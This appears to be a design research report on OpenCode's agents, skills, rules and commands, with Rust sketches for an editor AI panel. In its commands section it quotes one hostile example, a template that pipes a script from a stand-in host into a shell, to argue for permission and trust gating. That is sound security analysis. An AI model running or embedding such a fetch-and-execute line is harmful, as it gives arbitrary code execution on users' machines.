# OpenCode: Agents, Skills, Rules, Commands
## Research report for the Cowork AI panel (Rust editor)

**Sources (fetched 2026-09-11):**
- https://opencode.ai/docs/agents/
- https://opencode.ai/docs/skills/
- https://opencode.ai/docs/rules/
- https://opencode.ai/docs/commands/
- https://opencode.ai/docs/config/ (cross-check for directory naming + the `instructions` key)
- Secondary, **unverified against source**: a third-party gist reverse-engineering OpenCode's prompt assembly
  (`packages/opencode/src/session/prompt.ts`, `system.ts`, `instruction.ts`, `llm.ts`). Used only for the
  "how is the model told" question; flagged inline as [SECONDARY].

**Confidence key:** [DOC] = stated in the official docs. [SECONDARY] = third-party reverse engineering; verify
against the opencode repo before relying on it. [INFERRED] = my reading, not stated anywhere.

---

## 0. The mental model in one paragraph

OpenCode has **four distinct extension surfaces**, deliberately separated by *who triggers them*:

| Surface | Triggered by | Unit | Lives in |
|---|---|---|---|
| **Rules** (`AGENTS.md`) | nobody -- always on | prose | repo root / `~/.config/opencode/` |
| **Agents** | the user (Tab / `@`) **or** the model (`task` tool) | persona + tool policy + model | `agents/*.md` |
| **Skills** | the model (`skill` tool) | on-demand instruction blob | `skills/<name>/SKILL.md` |
| **Commands** | the user only (`/name`) | prompt template | `commands/*.md` |

The axis that matters: **rules are always in context; skills are advertised-then-loaded; agents are separate
context windows with their own tool policy; commands are just macro-expanded user input.** That four-way split is
the single most copyable idea in the whole design, and it is the thing Cowork should steal first.

---

# 1. AGENTS

## 1.1 How OpenCode does it

### What an agent *is*

An agent is a **config object**. It has two authoring surfaces that produce the same object: [DOC]

1. **A markdown file** -- YAML frontmatter = the config fields, markdown body = the system prompt.
2. **A JSON entry** under the `"agent"` key in `opencode.json` / `opencode.jsonc`.

The filename becomes the agent name: *"The markdown file name becomes the agent name. For example, `review.md`
creates a `review` agent."* [DOC]

Config files across scopes are **merged, not replaced** [DOC], so a project can override a single field of a
globally-defined agent.

### Directory layout

```
~/.config/opencode/          # global scope
├── opencode.json            # or opencode.jsonc
├── AGENTS.md                # global rules
├── agents/                  # global agents   (singular agent/ also accepted)
│   └── review.md
├── commands/                # global commands (singular command/ also accepted)
│   └── test.md
├── skills/
│   └── git-release/
│       └── SKILL.md
├── plugins/
├── tools/
├── modes/
└── themes/

<project>/
├── AGENTS.md                # project rules
├── opencode.json
└── .opencode/
    ├── agents/
    ├── commands/
    ├── skills/
    ├── plugins/
    └── tools/
```

The config docs state the plural forms are canonical and that *"Singular names (e.g., `agent/`) are also supported
for backwards compatibility."* [DOC] -- Note a **live inconsistency**: `opencode agent create` reportedly still
writes to `.opencode/agent/` (singular) while the docs say `agents/` (filed as a docs-mismatch issue). Lesson for
Cowork: **pick one name and never dual-support**, or you will ship exactly this bug.

Project-local discovery **walks up from the cwd until it reaches the git worktree root** [DOC]. That matters in
monorepos and it is the behaviour Cowork should copy for a workspace with multiple roots.

### Agent frontmatter -- complete field list [DOC]

| Field | Type | Meaning |
|---|---|---|
| `description` | string | **Required.** "a brief description of what the agent does and when to use it" -- this is what a primary agent reads to decide delegation. |
| `mode` | `primary` \| `subagent` \| `all` | Default `all`. Controls where the agent shows up. |
| `model` | string | `provider/model-id` override. |
| `temperature` | float 0.0-1.0 | Sampling. |
| `top_p` | float | Alternative to temperature. |
| `prompt` | string | Path to a system-prompt file, e.g. `{file:./prompts/x.txt}`, **relative to the config file**. |
| `steps` | integer | "maximum number of agentic iterations ... before being forced to respond with text only". |
| `disable` | boolean | Turn the agent off. |
| `permission` | object | Fine-grained tool policy (see below). |
| `tools` | object | **Deprecated** in favour of `permission`. |
| `color` | string | Hex (`#FF5733`) or theme token: `primary`, `secondary`, `accent`, `success`, `warning`, `error`, `info`. |
| `hidden` | boolean | Subagents only -- hide from the `@` autocomplete; still invokable programmatically. |

*"Additional fields are passed to the provider as model options."* [DOC] -- an escape hatch worth copying
(thinking budgets, `reasoning_effort`, provider-specific knobs) without schema churn.

### Verbatim example: markdown agent [DOC]

```markdown
---
description: Reviews code for quality and best practices
mode: subagent
model: anthropic/claude-sonnet-4-20250514
temperature: 0.1
permission:
  edit: deny
  bash: deny
---
You are in code review mode. Focus on:
- Code quality and best practices
- Potential bugs and edge cases
- Performance implications
- Security considerations

Provide constructive feedback without making direct changes.
```

### Verbatim example: JSON agent config [DOC]

```json
{
  "$schema": "https://opencode.ai/config.json",
  "agent": {
    "build": {
      "mode": "primary",
      "model": "anthropic/claude-sonnet-4-20250514",
      "prompt": "{file:./prompts/build.txt}",
      "permission": {
        "edit": "allow",
        "bash": "allow"
      }
    },
    "plan": {
      "mode": "primary",
      "model": "anthropic/claude-haiku-4-20250514",
      "permission": {
        "edit": "deny",
        "bash": "deny"
      }
    }
  }
}
```

And the older `tools` form, still shown on the config page [DOC] (deprecated on the agents page):

```json
"agent": {
  "code-reviewer": {
    "description": "Reviews code for best practices and potential issues",
    "model": "anthropic/claude-sonnet-4-5",
    "prompt": "You are a code reviewer...",
    "tools": { "write": false, "edit": false }
  }
}
```

### Primary agents vs subagents

- **Primary** -- *"main assistants you interact with directly"*. Own the top-level conversation. Switched with the
  **Tab key** / the `switch_agent` keybind. [DOC]
- **Subagent** -- *"specialized assistants primary agents can invoke"*. Run in a **child session** (navigate into it
  with `session_child_first`, default Leader+Down). [DOC]
- `mode: all` (the default) makes an agent eligible for both.

Subagents are invoked two ways, verbatim [DOC]:

> Subagents can be invoked:
> - **Automatically** by primary agents for specialized tasks based on their descriptions.
> - Manually by **@ mentioning** a subagent in your message. For example. `@general help me search for this function`

### Permissions -- the real tool-restriction mechanism

Values are `"allow"` | `"ask"` | `"deny"`. [DOC]

```json
"permission": {
  "edit": "deny",
  "bash": {
    "*": "ask",
    "git push": "ask",
    "grep *": "allow"
  },
  "skill": "deny"
}
```

Permission keys observed on the page: `read`, `edit`, `glob`, `grep`, `list`, `bash`, `task`, `external_directory`,
`todowrite`, `webfetch`, `websearch`, `lsp`, `skill`, `question`, `doom_loop`. [DOC]

Two subtleties worth copying exactly:

1. **Bash permissions are glob patterns and "last matching rule wins."** [DOC] Ordered pattern matching, not
   first-match -- so a broad `"*": "ask"` can be narrowed by later, more specific allows.
2. **`permission.task` gates which subagents an agent may delegate to, by glob** -- and crucially: when set to
   `deny`, *"the subagent is removed from the Task tool description entirely, so the model won't attempt to
   invoke it."* [DOC] Capability restriction is enforced **in the prompt, not just at the call site**. This is the
   single best design detail on the page. Do this.

### Built-in agents [DOC]

| Agent | Mode | Tools / permissions | Purpose (verbatim where quoted) |
|---|---|---|---|
| `build` | primary | all enabled | *"the **default** primary agent with all tools enabled ... full access to file operations and system commands"* |
| `plan` | primary | **file edits -> `ask`, bash -> `ask`** | *"A restricted agent designed for planning and analysis ... analyze code, suggest changes, or create plans without making any actual modifications"* |
| `general` | subagent | full tool access **except todo** | *"A general-purpose agent for researching complex questions and executing multi-step tasks."* |
| `explore` | subagent | read-only | *"A fast, read-only agent for exploring codebases. Cannot modify files."* |
| `scout` | subagent | read-only, external | *"A read-only agent for external docs and dependency research."* |

Note the `plan` defaults are **`ask`, not `deny`** [DOC] -- plan mode is an *escalation prompt*, not a hard sandbox.
(The JSON example on the same page shows `deny`, which is a user override, not the default.) Note also that the
docs' own example gives `plan` a **cheaper model** (haiku) than `build` (sonnet): per-agent model selection is a
first-class cost lever, not a cosmetic option.

[SECONDARY] Three further **hidden** built-ins exist for internal machinery: `compaction`, `title`, `summary` --
i.e. OpenCode models "summarize this session", "name this session" and "compact this context" as *agents* rather
than as bespoke code paths. That is an elegant unification and worth copying.

### How the model is told about agents -- the mechanism

This is the question you flagged, so here it is precisely:

- Subagents are exposed as a **`task` tool**. [DOC -- implied by `permission.task` plus the phrase "the Task tool
  description"]
- [SECONDARY] The `task` tool's description is **built at runtime from a `.txt` template** containing an
  `{agents}` placeholder, replaced with *"a generated list of available subagents, filtered by the calling agent's
  permissions."*

So: **agent list -> tool description**, not -> system prompt. The `permission.task: deny` behaviour quoted above
confirms this from the docs side: denying an agent removes it from the *tool description*.

Consequence for Cowork: the set of delegable agents is part of the tool schema, so changing it **invalidates prompt
cache**. Put the volatile agent list at the *end* of the tool description and keep the static preamble stable.

### CLI

`opencode agent create` -- interactive flow, verbatim steps [DOC]:

> 1. Ask where to save the agent; global or project-specific.
> 2. Description of what the agent should do.
> 3. Generate an appropriate system prompt and identifier.
> 4. Let you select which permissions the agent should be allowed (anything you don't select is denied).
> 5. Finally, create a markdown file with the agent configuration.

Step 3 is notable: **the LLM writes the agent's system prompt from a one-line description.** Cheap, high-leverage,
and a good first-run experience. Step 4's default-deny posture is correct.

## 1.2 What Cowork would need

### Data model (Rust sketch)

```rust
#[derive(Debug, Clone, Deserialize)]
pub struct AgentDef {
    pub description: String,                // required
    #[serde(default)]
    pub mode: AgentMode,                    // Primary | Subagent | All
    pub model: Option<ModelRef>,            // "provider/model-id"
    pub temperature: Option<f32>,
    pub top_p: Option<f32>,
    pub prompt: Option<PromptRef>,          // inline | {file:...}
    pub steps: Option<u32>,
    #[serde(default)]
    pub disable: bool,
    #[serde(default)]
    pub permission: PermissionSet,
    pub color: Option<ColorRef>,
    #[serde(default)]
    pub hidden: bool,
    #[serde(flatten)]
    pub provider_options: serde_json::Map<String, serde_json::Value>, // pass-through

    // resolved, not authored:
    #[serde(skip)] pub name: String,        // from filename
    #[serde(skip)] pub source: AgentSource, // Builtin | Global(PathBuf) | Project(PathBuf) | Extension(id)
    #[serde(skip)] pub body: String,        // markdown after frontmatter = system prompt
}

#[derive(Debug, Clone, Default)]
pub struct PermissionSet(BTreeMap<ToolKey, Rule>);

#[derive(Debug, Clone)]
pub enum Rule {
    Simple(Decision),                            // Allow | Ask | Deny
    Patterned(Vec<(glob::Pattern, Decision)>),   // last match wins
}
```

### Loader requirements

1. **Scan order** (later overrides earlier, field-level merge):
   builtin -> `~/.config/cowork/agents/*.md` -> global JSON `agent{}` -> walk-up `.cowork/agents/*.md` from the
   active file's directory to the worktree root -> project JSON `agent{}`.
2. **Frontmatter parse**: `---\n<yaml>\n---\n<body>`. In Rust, `gray_matter`, or a hand-rolled split plus
   `serde_yaml`/`serde_yaml_ng`. Reuse whatever the editor already vendors for extension manifests rather than
   adding a dependency.
3. **Filename -> name**, validated against `^[a-z0-9]+(-[a-z0-9]+)*$` (the same regex OpenCode applies to skills;
   apply it to agents too -- OpenCode doesn't, and that is a gap).
4. **Hot reload.** Table stakes in an editor; OpenCode (a TUI) gets away without it. Watch the agent dirs; on
   change, re-resolve and mark the `task` tool description dirty. Do **not** mutate an in-flight session's agent --
   snapshot the resolved `AgentDef` into the session at start.
5. **Error surfacing.** Malformed frontmatter must produce a diagnostic in the panel, not a silent skip. An editor
   has a diagnostics surface; use it.

### Runtime requirements

- **A `task` tool** whose JSON schema and description are generated per-session from the resolved, permission-
  filtered subagent list. Child sessions get their own context window, their own transcript node, and their
  parent's permission set **intersected** with their own (see 1.3 #3).
- **`@`-mention autocomplete** in the composer, backed by the non-`hidden` subagent list.
- **Agent switcher** for primary agents. Tab is taken in an editor; use a modal picker (`agent: switch` action)
  plus a persistent affordance in the panel header showing the active agent and its color.
- **Permission broker**: one choke point every tool call passes through, resolving
  `(agent, tool, args) -> Allow | Ask(prompt) | Deny`, with the `ask` path rendering as a blocking affordance in
  the panel and remembering "allow for this session".

## 1.3 Design calls -- good / would do differently

**Good, copy it:**

- **Markdown-with-frontmatter as the primary authoring format.** Version-controllable, diffable, reviewable in a
  PR, co-locates prompt with policy. The prompt *is* the file body -- no escaping, no JSON string full of `\n`.
- **Deny removes from the tool description, not just the call site.** Prevents the model wasting turns on tools it
  cannot use, and prevents "I tried X but was blocked" noise.
- **`ask` as a first-class third state.** Binary allow/deny forces you to either over-grant or nag.
- **Glob patterns for bash with last-match-wins.** Expressive enough for real policy without inventing a DSL.
- **Per-agent model.** Cheap model for plan/explore, expensive for build. Directly reduces cost.
- **Unknown frontmatter keys pass through to the provider.** New provider knobs need no schema release.
- **Internal machinery (title, compaction, summary) modelled as hidden agents.** One code path, and users can
  override the model used for compaction.
- **LLM-generated system prompt in `agent create`.** Removes the blank-page problem.

**Would do differently:**

1. **Dual singular/plural directory names is a self-inflicted wound.** They already shipped a CLI/docs mismatch
   because of it. Pick `agents/` and reject the other with a clear diagnostic.
2. **`mode: all` as the default is wrong.** Most authored agents are subagents; defaulting to "also a primary
   agent" pollutes the switcher. Default to `subagent`, require opt-in to `primary`.
3. **Permission inheritance is under-specified.** The docs never say whether a subagent's permissions are
   intersected with its caller's. Cowork should **specify and enforce intersection** -- a subagent invoked from
   `plan` must not be able to escape plan mode. This is the #1 hole in a naive copy of the design.
4. **No path scoping.** `edit: allow` is all-or-nothing across the worktree. An editor knows the project layout;
   support `edit: { "src/**": "allow", "**/*.lock": "deny" }` with the same last-match-wins semantics as bash.
   Genuine differentiator, and cheap given the glob machinery already exists.
5. **No versioning on agent files.** Add `schema: 1` so you can evolve without breaking every user's `agents/` dir.
6. **`tools` is deprecated on one page and still the featured example on another.** Deprecate loudly and once,
   with a migration diagnostic.
7. **No per-agent context/token budget.** `steps` bounds iterations but not tokens. An exploration subagent that
   reads 40 files blows the budget in three steps. Add `max_context_tokens` / `max_cost`.
8. **Agent list lives in a tool description -> cache invalidation.** Keep the volatile list last and the preamble
   stable; the docs show no awareness of this.

---

# 2. SKILLS

## 2.1 How OpenCode does it

### What a skill is

*"Reusable instructions"* discovered from the repo or the home directory. The architectural distinction from an
agent:

- An **agent** is an *actor* -- it has a model, a context window, a tool policy, a session.
- A **skill** is *passive content* -- a blob of instructions the current agent pulls into its own context, on
  demand, with no context switch, no model change, no child session. [DOC]

### Directory layout and discovery paths

Search paths, in discovery order [DOC]:

```
.opencode/skills/<name>/SKILL.md
~/.config/opencode/skills/<name>/SKILL.md
.claude/skills/<name>/SKILL.md
~/.claude/skills/<name>/SKILL.md
.agents/skills/<name>/SKILL.md
~/.agents/skills/<name>/SKILL.md
```

Project-local paths are found by *"walk[ing] up from your current working directory until it reaches the git
worktree"* [DOC]. On a name collision, **project-level skills overwrite global ones** [SECONDARY].

The `<name>/SKILL.md` directory-per-skill shape (rather than `<name>.md`) exists so a skill can ship **sibling
files** -- scripts, templates, reference docs -- that the body text tells the model to read on demand.

### SKILL.md frontmatter [DOC]

**Required:**

| Field | Constraint |
|---|---|
| `name` | 1-64 chars, must match `^[a-z0-9]+(-[a-z0-9]+)*$` |
| `description` | 1-1024 chars |

**Optional:** `license` (string), `compatibility` (string), `metadata` (string -> string map).

Verbatim example [DOC]:

```markdown
---
name: git-release
description: Create consistent releases and changelogs
license: MIT
compatibility: opencode
metadata:
  audience: maintainers
  workflow: github
---

## What I do
- Draft release notes from merged PRs
- Propose a version bump
- Provide a copy-pasteable `gh release create` command

## When to use me
Use this when preparing a tagged release.
Ask clarifying questions if versioning is unclear.
```

### Discovery -> trigger mechanism (progressive disclosure)

This is the important part, and unlike the agent mechanism it is **explicitly documented**:

1. Skills are exposed as a **native `skill` tool**.
2. The tool description contains an XML manifest of every discovered skill -- name + description only [DOC]:

```xml
<available_skills>
  <skill>
    <name>git-release</name>
    <description>Create consistent releases and changelogs</description>
  </skill>
</available_skills>
```

3. The model calls `skill({ name: "git-release" })` and **the full SKILL.md body comes back as the tool result**,
   entering context at that point and not before.

[SECONDARY] The `skill` tool has **no static `.txt` description file at all** -- *"its entire description is built
at init from the list of discovered skills, formatted as an XML block with each skill's name, description, and file
location."*

Cost model: **N skills x ~1 line each, always in context; full body only when used.** That is the whole point.
`description` is therefore load-bearing -- it is the only thing the model sees when deciding.

### Anthropic Agent Skills compatibility

OpenCode reads `.claude/skills/` and `~/.claude/skills/` directly [DOC], and `name` / `description` / `license` /
`metadata` mirror Anthropic's Agent Skills frontmatter. `compatibility` is OpenCode's own addition. Effectively
**OpenCode adopted the Anthropic spec wholesale and added extra search paths** -- so any skill written for Claude
Code works unmodified.

Note: OpenCode's documented optional set does **not** include Anthropic's `allowed-tools`; tool restriction for
skills is done via `permission.skill` instead. [INFERRED from omission -- verify against source.]

Claude Code interop is switchable via env vars [DOC]:

- `OPENCODE_DISABLE_CLAUDE_CODE=1` -- all `.claude` support
- `OPENCODE_DISABLE_CLAUDE_CODE_PROMPT=1` -- only `~/.claude/CLAUDE.md`
- `OPENCODE_DISABLE_CLAUDE_CODE_SKILLS=1` -- only `~/.claude/skills/`

### Permissions over skills [DOC]

```json
{
  "permission": {
    "skill": {
      "*": "allow",
      "internal-*": "deny",
      "experimental-*": "ask"
    }
  }
}
```

Behaviours: `allow` = immediate; `deny` = **hidden** (removed from `<available_skills>`); `ask` = user approval.
Same "deny means invisible" principle as `permission.task`. Overridable per agent in frontmatter. Disable the whole
mechanism with `tools: { skill: false }`.

## 2.2 What Cowork would need

- A **skill registry** built at session start: walk `.cowork/skills/`, `~/.config/cowork/skills/`, and -- strongly
  recommended -- `.claude/skills/` + `~/.claude/skills/` for free ecosystem compatibility.
- Frontmatter validation with the exact `^[a-z0-9]+(-[a-z0-9]+)*$` regex and the 64 / 1024 length caps, so skills
  authored for Claude Code validate identically.
- A **`skill` tool** whose description is generated from the registry as the `<available_skills>` XML block,
  filtered by the active agent's `permission.skill`. Tool result = the SKILL.md body.
- **Relative-path resolution**: when a skill body says "run `scripts/bump.sh`", the model needs the absolute skill
  directory. Return it explicitly in the tool-result header (OpenCode reportedly includes "file location").
- Editor-native additions worth having: a skills list in the panel's settings, a "why did this skill load?"
  affordance in the transcript, and a diagnostic when two skills collide by name.

## 2.3 Design calls -- good / would do differently

**Good:**

- **Progressive disclosure via a tool-description manifest** is the correct answer to "how do I have 50 skills
  without 50k tokens of system prompt". Copy this exactly.
- **Directory-per-skill**, so skills can carry scripts and templates.
- **Adopting Anthropic's spec verbatim** -- instant ecosystem, zero authoring migration. Cowork should do the same
  rather than invent `COWORK-SKILL.md`.
- **`deny` = invisible**, consistent with agents.
- **`metadata` as a free-form map** -- teams can tag skills without spec changes.

**Would do differently:**

1. **No trigger hints beyond `description`.** A `when-to-use` / `triggers: [globs, languages]` field would let the
   host **pre-filter** the manifest by what is actually open in the editor -- a Rust editor knows the project is
   Rust and can drop the Python skills from the manifest entirely. Big token win, and unavailable to a TUI.
2. **No dependency or ordering between skills**, and no way for a skill to declare which tools it needs.
   Anthropic's `allowed-tools` exists for a reason; support it.
3. **Six search paths is too many.** `.agents/skills/` in particular is speculative. Two native + two Claude-compat
   is enough.
4. **Nothing bounds SKILL.md size.** A 20k-token skill silently blows the context when loaded. Lint it at author
   time in the editor, and truncate-with-notice at load time.
5. **No content trust boundary.** A skill is instructions from a file in the repo -- i.e. from whoever opened the
   PR. OpenCode treats it as trusted. In an editor with untrusted-workspace semantics, **skills from a non-trusted
   workspace must not auto-register.** This is a real security gap in the original and the most important thing to
   fix rather than copy.

---

# 3. RULES (AGENTS.md)

## 3.1 How OpenCode does it

### Filenames and locations [DOC]

| Scope | File |
|---|---|
| Project | `AGENTS.md` at the project root (and found by walking up from the cwd) |
| Project, legacy | `CLAUDE.md` -- fallback if no `AGENTS.md` |
| Global | `~/.config/opencode/AGENTS.md` |
| Global, legacy | `~/.claude/CLAUDE.md` -- unless disabled |

[SECONDARY] `CONTEXT.md` is also recognised by the instruction loader.

### Precedence [DOC]

The documented search sequence:

1. Local files, walking **up** from the current directory (`AGENTS.md`, then `CLAUDE.md`)
2. Global `~/.config/opencode/AGENTS.md`
3. Claude Code's `~/.claude/CLAUDE.md` (unless disabled)

*"The first matching file wins in each category."* [DOC] -- i.e. **within a category** it is first-wins, but the
categories themselves all contribute; local, global and Claude-compat files are combined, not mutually exclusive.
All configured `instructions` files are likewise *"combined with `AGENTS.md`"* [DOC].

### How the combination is materialised

[SECONDARY] Each file is concatenated into the system prompt prefixed with `"Instructions from: <path>"`. The
overall system prompt assembly order is:

1. **Environment block** -- model name, working directory, platform, current date
2. **Provider-specific base prompt**, selected by model id (`anthropic.txt`, `beast.txt`, `gemini.txt`,
   `codex_header.txt`, `trinity.txt`, `qwen.txt`)
3. **Instruction files** -- `AGENTS.md` / `CLAUDE.md` / `CONTEXT.md`

Then a plugin hook `experimental.chat.system.transform` can mutate the assembled array, with a safety fallback
that restores the original if a plugin empties it.

**The most interesting detail in the whole research set** [SECONDARY]: nested `AGENTS.md` files are **not** all
loaded up front. Instead, *"during tool execution: the `read` tool triggers discovery in subdirectories, injecting
findings as `<system-reminder>` blocks"*, with de-duplication within a turn. So subdirectory rules load **lazily,
the first time the agent touches a file in that subtree.** That is exactly the right answer for monorepos, and it
is a mechanism, not a convention. (The docs page only mentions lazy loading as something *you can instruct the
model to do in prose* -- the automatic version is source-level behaviour and should be verified.)

### The `instructions` config key [DOC]

```json
{
  "$schema": "https://opencode.ai/config.json",
  "instructions": ["CONTRIBUTING.md", "docs/guidelines.md", ".cursor/rules/*.md"]
}
```

- **Glob patterns supported** -- e.g. `packages/*/AGENTS.md` for a monorepo.
- **Remote URLs supported**, with a 5-second timeout.
- Contents are combined with `AGENTS.md`.
- Config values generally support `{file:path}` inclusion and `{env:VARIABLE_NAME}` substitution. [DOC]

Note the `.cursor/rules/*.md` example: OpenCode is explicitly hoovering up competitors' rule formats.

### Per-agent rules

Not supported as a separate mechanism [DOC]. An agent's own system prompt is its frontmatter body or its `prompt`
file; rules apply session-wide on top of that.

### Initialisation

`/init` scans the repo and creates or updates `AGENTS.md` with build commands, architecture notes and conventions.
[DOC]

## 3.2 What Cowork would need

- **A `RuleSet` resolver** producing an ordered `Vec<(PathBuf, String)>`, each rendered with a provenance header
  (`Instructions from: <path>`). Provenance matters: when a rule misfires, users need to know which file did it.
- **Walk-up from the active buffer's directory to the worktree root**, not from a single process cwd. An editor has
  many open files across many roots; the resolver must be per-workspace-root, and the panel must show which root
  the session is bound to.
- **Lazy subtree rules.** Implement the `read`-triggered discovery: when a tool reads `crates/foo/bar.rs`, check
  `crates/foo/AGENTS.md` (and intermediate dirs) and inject once per session as a system-reminder-style block.
  This is the single biggest win for a 163-crate monorepo and it is cheap to build.
- **`instructions` config key** with globs. Skip remote URLs, or gate them behind workspace trust (see below).
- **Compatibility reads** for `CLAUDE.md` and `.cursor/rules/` behind a setting, defaulted on for `CLAUDE.md`.
- **A token budget display.** Show "rules: 3 files, 4.2k tokens" in the panel. Rules are the one always-on cost and
  users currently have no visibility into it anywhere.

## 3.3 Design calls -- good / would do differently

**Good:**

- **`AGENTS.md` as the canonical, vendor-neutral name** with `CLAUDE.md` as fallback. Right call -- interoperate,
  don't fragment.
- **Env vars to switch off Claude Code interop** at three granularities. Clean, no config file needed, easy to set
  in CI.
- **`instructions` with globs + remote URLs.** Monorepo-friendly; lets a platform team publish shared rules.
- **Lazy, `read`-triggered nested rule loading** [SECONDARY]. Best idea in the whole set. Copy it.
- **`/init` to bootstrap.** An empty `AGENTS.md` is the common failure mode; generating one solves it.

**Would do differently:**

1. **Remote URL instructions are an unreviewed remote-code-for-the-model path.** A repo's `opencode.json` can point
   at a URL that injects arbitrary instructions into every session. Gate behind explicit workspace trust, pin by
   hash, and show the fetched content in the panel before first use. Do not ship this unguarded.
2. **"First matching file wins in each category" is confusing.** Users expect either "nearest wins" or "all
   concatenated". Pick one and document it with a worked example; Cowork should concatenate walk-up files nearest-
   last so the most specific rules are most recent in context.
3. **No conflict resolution or ordering control.** With global + project + three `instructions` globs, the order is
   implementation-defined. Make it explicit and stable, and surface it in the panel.
4. **No per-agent rule scoping.** A `plan` agent rarely needs the commit-message conventions. Allow rules to
   declare `applies-to: [build, review]` in optional frontmatter -- a small addition with real token savings.
5. **No size guard.** A 30k-token `AGENTS.md` silently eats the window every turn. Warn above a threshold.

---

# 4. COMMANDS

## 4.1 How OpenCode does it

### What a command is

A **reusable prompt template** invoked as `/name` in the TUI. Like agents, it has two authoring surfaces: a
markdown file, or a JSON object under `"command"` in `opencode.json`. [DOC]

`test.md` -> `/test`. [DOC]

### Locations [DOC]

```
~/.config/opencode/commands/     # global   (singular command/ also accepted)
<project>/.opencode/commands/    # project
```

No nested-directory namespacing is documented. [DOC -- absence]

### Frontmatter fields [DOC]

| Field | Type | Meaning |
|---|---|---|
| `description` | string | Shown in the TUI slash menu. |
| `agent` | string | Which agent executes this; defaults to the current agent. |
| `model` | string | Model override for this invocation. |
| `subtask` | boolean | *"force the command to trigger a subagent invocation"* -- *"will **force** the agent to act as a subagent, even if `mode` is set to `primary`"*. |
| `template` | string | JSON-config form only: the prompt body (in markdown the body *is* the template). |

### Verbatim examples [DOC]

`.opencode/commands/test.md`:

```markdown
---
description: Run tests with coverage
agent: build
model: anthropic/claude-3-5-sonnet-20241022
---
Run the full test suite with coverage report and show any failures.
Focus on the failing tests and suggest fixes.
```

JSON equivalent in `opencode.jsonc`:

```json
{
  "$schema": "https://opencode.ai/config.json",
  "command": {
    "test": {
      "template": "Run the full test suite with coverage report and show any failures.\nFocus on the failing tests and suggest fixes.",
      "description": "Run tests with coverage",
      "agent": "build",
      "model": "anthropic/claude-3-5-sonnet-20241022"
    }
  }
}
```

`.opencode/commands/component.md` -- `$ARGUMENTS`:

```markdown
---
description: Create a new component
---
Create a new React component named $ARGUMENTS with TypeScript support.
Include proper typing and basic structure.
```

File reference via `@`:

```markdown
---
description: Review component
---
Review the component in @src/components/Button.tsx.
Check for performance issues and suggest improvements.
```

Shell injection via `` !`cmd` ``:

```markdown
---
description: Analyze test coverage
---
Here are the current test results:
!`npm test`

Based on these results, suggest improvements to increase coverage.
```

### Placeholders [DOC]

| Syntax | Behaviour |
|---|---|
| `$ARGUMENTS` | All arguments, concatenated |
| `$1`, `$2`, `$3`, ... | Positional arguments |
| `` !`command` `` | Run the shell command, inject its **output** into the prompt |
| `@path/to/file` | Inject the file's content into the prompt |

Positional example [DOC]: `/create-file config.json src "{ \"key\": \"value\" }"` maps `$1` -> `config.json`,
`$2` -> `src`, `$3` -> the JSON string.

### How commands differ from agents and skills

- **Commands are pure user-side macro expansion.** The model never sees the command definition -- only the
  fully-substituted text, indistinguishable from something the user typed. [DOC states the slash menu surface;
  model-visibility is not stated -- INFERRED from the substitution model, and consistent with the design.]
- A command can *retarget* the turn (`agent`, `model`) and can *force delegation* (`subtask: true`), which is the
  bridge from the command surface to the agent surface.
- Compared to skills: a skill is chosen by the **model**, a command is chosen by the **user**. Same content shape,
  opposite trigger.

## 4.2 What Cowork would need

- **Command registry + slash-menu** in the composer: `/` opens a filterable list with `description` as subtitle.
  Standard editor picker; Anna/Zed already has the component.
- **Template expander** with `$ARGUMENTS`, `$1..$n`, `@file`, `` !`shell` ``. Two hard requirements OpenCode does
  not clearly address:
  - **`!`shell`` must go through the permission broker.** Right now a repo-supplied `.opencode/commands/x.md`
    containing `` !`curl evil.sh | sh` `` executes the moment a user types `/x`. In Cowork this must prompt, and
    must be blocked entirely in an untrusted workspace.
  - **`@file` should accept editor selectors**, not just paths: `@selection`, `@buffer`, `@diff`, `@problems`,
    `@symbol:Foo`. This is where an editor beats a TUI outright, and it is a small amount of code.
- **Argument hints.** Declare `args: [name, dir, content]` in frontmatter so the slash menu can show
  `/create-file <name> <dir> <content>` and pre-fill placeholders. OpenCode has no such thing.
- **Namespacing.** Support `commands/git/sync.md` -> `/git:sync`. Flat namespaces collapse fast once teams share
  command packs.

## 4.3 Design calls -- good / would do differently

**Good:**

- **Commands as plain prompt templates with no bespoke runtime.** Radically simple, and it composes: a command can
  target an agent and force a subtask.
- **`!`cmd`` and `@file` injection.** Gets real context in cheaply without a tool round-trip.
- **`subtask: true`** -- one flag to send a heavy command into a child session so it doesn't pollute the main
  context. Nice.
- **Both markdown and JSON authoring**, consistently with agents.

**Would do differently:**

1. **`` !`cmd` `` is arbitrary code execution from a repo file, triggered by a keystroke.** Must be permission-
   gated and trust-gated. This is the most dangerous thing in the four pages.
2. **No argument declaration/validation.** `$1` silently becomes empty if the user forgets it, and the model gets a
   malformed prompt with no error. Declare arity; validate before sending.
3. **No namespacing.** Add it before the ecosystem exists, not after.
4. **Commands are invisible to the model.** Mostly correct, but it means the model can never suggest "you could run
   `/test`". A short list of command names in the system prompt (names + descriptions only, ~1 line each) would let
   it recommend them. Low cost, real benefit.
5. **Shell output injection is unbounded.** `` !`npm test` `` on a large repo can inject 100k characters. Truncate
   with a head/tail window and say so inline.

---

# 5. Cross-cutting: the pattern to copy

## 5.1 The unifying mechanism

Three of the four surfaces resolve to the **same two primitives**:

- **A generated tool description** (`task` for agents, `skill` for skills), rebuilt per session from the
  permission-filtered registry. Deny = omitted from the description = invisible to the model.
- **A permission triple** (`allow` / `ask` / `deny`), optionally pattern-matched with last-match-wins, applied
  uniformly across bash commands, subagent names and skill names.

Rules are the odd one out: always-on system-prompt text, with a lazy `read`-triggered extension for subtrees.

If Cowork builds exactly those two primitives well -- **a permission-filtered registry that renders into a tool
description**, and **one permission broker** -- all four surfaces fall out of them.

## 5.2 Suggested build order for Cowork

1. **Rules** (`AGENTS.md` walk-up + concat + provenance headers). Highest value per line of code; no new UI.
2. **Permission broker + `ask` UI.** Everything else depends on it; retrofitting it later is painful.
3. **Skills** (Anthropic-spec-compatible, `skill` tool with `<available_skills>` manifest). Free ecosystem.
4. **Agents** (markdown loader, `task` tool, child sessions, agent picker). The big one.
5. **Commands** (slash menu, template expander, editor-aware `@` selectors). Easiest to make visibly better than
   OpenCode.
6. **Lazy nested rules** via read-triggered discovery. The monorepo payoff.

## 5.3 Where Cowork can beat OpenCode (editor-only advantages)

- **Context-aware pre-filtering** of the skill/agent manifests by open language, active crate, current diff.
- **`@selection` / `@diff` / `@problems` / `@symbol` placeholders** in commands and mentions.
- **Workspace trust** gating skills, `instructions` URLs and `` !`shell` `` -- OpenCode has no trust model at all.
- **Diagnostics for malformed agent/skill files** in the problems panel instead of silent skips.
- **Hot reload** of agents/skills/rules on file save.
